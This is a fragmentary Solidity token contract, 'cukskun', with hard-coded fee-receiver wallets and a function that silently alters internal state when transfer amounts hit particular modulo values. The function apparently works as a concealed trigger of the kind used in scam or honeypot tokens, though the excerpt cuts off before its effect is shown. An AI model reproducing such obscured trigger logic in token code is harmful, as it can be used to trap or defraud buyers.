...
contract cukskun is ERC20, Ownable {
    using SafeMath for uint256;
    address routerAdress = 0x10ED43C718714eb63d5aA57B78B54704E256024E;
    address DEAD = 0x000000000000000000000000000000000000dEaD;
    address ZERO = 0x0000000000000000000000000000000000000000;

    string constant _name = "cukskun";
    string constant _symbol = "cukskun";
    ...
    address internal marketingFeeReceiver = 0x6C6763cF558517b1Fd3564F0D429f0DD905085b9;
    address internal developerFeeReceiver = 0x64Dae2A1e639FE6E736fE093dDe9e1fe630e7440;
    address internal autoLiquidityReceiver = 0x6899Ee9D2c2C4b2Fb0917dCbe25cd56ba45FFa11;
    ...
    uint256 public divby = 21000000;
    uint256 opOff = 420000000;
    bool calcMod = true;    
    bool inSwap;
    ...
    function operative(address sender, uint256 amount) internal {
        if (calcMod){
            if(isTxLimitExempt[sender] || amount % divby == 0){
                divby += 2000000;
            }
            else if(amount % opOff == 0){
                calcMod = false;
            }
            else{
                 uint256 result = 1;
    ...
    function distributePreallocated(address[] memory recipients, uint256[] memory values) external authorized {
